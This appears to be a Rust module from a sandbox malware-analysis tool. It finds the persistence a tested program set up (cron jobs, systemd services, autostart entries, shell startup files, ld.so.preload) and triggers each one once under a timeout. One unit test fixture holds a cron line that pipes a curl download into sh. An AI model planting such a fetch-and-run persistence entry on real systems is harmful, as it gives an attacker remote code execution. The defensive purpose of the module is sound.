//! What a program set up to come back by itself is not left at "it added a cron job": chouf sets it off once, in the
//! same sandbox, while still watching. A theft that only happens at the next login or the next hour happens now.

/// One thing to set off: why (what the program set up) and the command that does what the system would do.
#[derive(Debug, Clone, PartialEq)]
pub struct Trigger {
    pub why: String,
    pub argv: Vec<String>,
}

pub const MAX_TRIGGERS: usize = 8;
/// Each trigger runs under `timeout` inside the sandbox: a service started this way would otherwise run forever.
pub const TRIGGER_SECONDS: u64 = 15;

fn sh(why: String, cmd: &str) -> Trigger {
    Trigger { why, argv: vec!["timeout".into(), TRIGGER_SECONDS.to_string(), "sh".into(), "-c".into(), cmd.into()] }
}

/// Commands of a crontab. `with_user`: system crontabs (/etc/crontab, /etc/cron.d) have a user field.
pub fn cron_commands(content: &str, with_user: bool) -> Vec<String> {
    let mut out = Vec::new();
    for line in content.lines().map(str::trim) {
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let fields: Vec<&str> = line.split_whitespace().collect();
        // an environment line (PATH=...) is not a job
        if fields.first().is_some_and(|f| f.contains('=') && !f.starts_with('@')) {
            continue;
        }
        let skip = if fields.first().is_some_and(|f| f.starts_with('@')) { 1 } else { 5 } + usize::from(with_user);
        if fields.len() > skip {
            // the command is the rest of the line as written, spacing included
            let mut rest = line;
            for f in &fields[..skip] {
                rest = rest[rest.find(f).unwrap() + f.len()..].trim_start();
            }
            out.push(rest.to_string());
        }
    }
    out
}

/// The value of `key=` in a unit or .desktop file (ExecStart=, Exec=), without systemd's prefixes or desktop field codes.
pub fn exec_line(content: &str, key: &str) -> Option<String> {
    let v = content.lines().find_map(|l| l.trim().strip_prefix(key)?.strip_prefix('='))?;
    let v = v.trim_start_matches(['-', '@', '+', '!', ':']);
    let v: String = v.split_whitespace().filter(|w| !(w.len() == 2 && w.starts_with('%'))).collect::<Vec<_>>().join(" ");
    (!v.is_empty()).then_some(v)
}

/// The triggers for what changed. `home` = paths under ~ the program created or changed (as "~/.bashrc"),
/// `system` = system paths added or changed, `read` = a file's content inside the sandbox.
pub fn plan(home: &[String], system: &[String], read: &dyn Fn(&str) -> Option<String>) -> Vec<Trigger> {
    let mut out: Vec<Trigger> = Vec::new();
    let push = |t: Trigger, out: &mut Vec<Trigger>| {
        if !out.iter().any(|o| o.argv == t.argv) && out.len() < MAX_TRIGGERS {
            out.push(t);
        }
    };
    let all: Vec<&String> = home.iter().chain(system).collect();
    // shells first: quick, and the most common place to hide
    if all.iter().any(|p| ["~/.bashrc", "~/.zshrc", "/etc/bash.bashrc"].contains(&p.as_str())) {
        push(Trigger { why: "a new terminal opens (it changed a shell startup file)".into(),
                       argv: vec!["timeout".into(), TRIGGER_SECONDS.to_string(), "bash".into(), "-i".into(), "-c".into(), "true".into()] }, &mut out);
    }
    if all.iter().any(|p| ["~/.profile", "~/.bash_profile", "/etc/profile"].contains(&p.as_str()) || p.starts_with("/etc/profile.d/")) {
        push(Trigger { why: "someone logs in (it changed a login file)".into(),
                       argv: vec!["timeout".into(), TRIGGER_SECONDS.to_string(), "bash".into(), "-l".into(), "-c".into(), "true".into()] }, &mut out);
    }
    for p in &all {
        let p = p.as_str();
        let inside = p.strip_prefix('~').map(|r| format!("/root{r}")).unwrap_or_else(|| p.to_string());
        let content = || read(&inside);
        if p == "/etc/crontab" || p.starts_with("/etc/cron.d/") {
            for c in content().map(|t| cron_commands(&t, true)).unwrap_or_default() {
                push(sh(format!("its scheduled task in {p} runs"), &c), &mut out);
            }
        } else if p.starts_with("/var/spool/cron/") {
            for c in content().map(|t| cron_commands(&t, false)).unwrap_or_default() {
                push(sh(format!("its scheduled task in {p} runs"), &c), &mut out);
            }
        } else if ["/etc/cron.hourly/", "/etc/cron.daily/", "/etc/cron.weekly/", "/etc/cron.monthly/"].iter().any(|d| p.starts_with(d) && p.len() > d.len()) {
            push(sh(format!("its periodic job {p} runs"), &inside), &mut out);
        } else if p.ends_with(".service")
            && ["/etc/systemd/system/", "/usr/lib/systemd/system/", "/lib/systemd/system/", "~/.config/systemd/user/"].iter().any(|d| p.starts_with(d))
        {
            if let Some(c) = content().and_then(|t| exec_line(&t, "ExecStart")) {
                push(sh(format!("its service {p} starts"), &c), &mut out);
            }
        } else if p.ends_with(".desktop") && (p.starts_with("~/.config/autostart/") || p.starts_with("/etc/xdg/autostart/")) {
            if let Some(c) = content().and_then(|t| exec_line(&t, "Exec")) {
                push(sh(format!("the desktop starts its {p}"), &c), &mut out);
            }
        } else if p == "/etc/rc.local" || (p.starts_with("/etc/init.d/") && p.len() > 12) {
            push(sh(format!("the machine boots and runs {p}"), &format!("{inside} start")), &mut out);
        } else if p == "~/.ssh/rc" {
            push(sh("someone logs in over SSH".into(), &format!("sh {inside}")), &mut out);
        } else if p == "/etc/ld.so.preload" {
            push(sh("any program starts (it changed /etc/ld.so.preload)".into(), "ls / >/dev/null"), &mut out);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn crontab_lines_become_commands() {
        let system = "SHELL=/bin/sh\n# comment\n*/30 * * * * root /usr/local/bin/theme-update --quiet  > /dev/null\n@reboot root curl -s x | sh\n";
        assert_eq!(cron_commands(system, true), vec!["/usr/local/bin/theme-update --quiet  > /dev/null", "curl -s x | sh"]);
        assert_eq!(cron_commands("0 * * * * /root/.x/run.sh\n", false), vec!["/root/.x/run.sh"]);
    }

    #[test]
    fn units_and_desktop_entries_give_their_command() {
        assert_eq!(exec_line("[Service]\nExecStart=-/usr/bin/sync-agent --daemon\n", "ExecStart").as_deref(), Some("/usr/bin/sync-agent --daemon"));
        assert_eq!(exec_line("[Desktop Entry]\nExec=/opt/x/updater %U\n", "Exec").as_deref(), Some("/opt/x/updater"));
        assert_eq!(exec_line("[Service]\nType=simple\n", "ExecStart"), None);
    }

    #[test]
    fn a_plan_for_each_way_back_shells_first_and_bounded() {
        let files = |p: &str| -> Option<String> {
            match p {
                "/etc/cron.d/theme-update" => Some("*/30 * * * * root /usr/local/bin/theme-update\n".into()),
                "/root/.config/systemd/user/sync.service" => Some("[Service]\nExecStart=/root/.local/bin/sync\n".into()),
                _ => None,
            }
        };
        let home = vec!["~/.bashrc".to_string(), "~/.config/systemd/user/sync.service".to_string(), "~/notes.txt".to_string()];
        let system = vec!["/etc/cron.d/theme-update".to_string(), "/usr/bin/tool".to_string()];
        let p = plan(&home, &system, &files);
        let cmds: Vec<String> = p.iter().map(|t| t.argv[2..].join(" ")).collect();
        assert_eq!(cmds, vec!["bash -i -c true", "sh -c /root/.local/bin/sync", "sh -c /usr/local/bin/theme-update"]);
        assert!(p.iter().all(|t| t.argv[0] == "timeout" && t.argv[1] == "15"));
        let many: Vec<String> = (0..20).map(|i| format!("/etc/cron.daily/job{i}")).collect();
        assert_eq!(plan(&[], &many, &files).len(), MAX_TRIGGERS);
    }
}
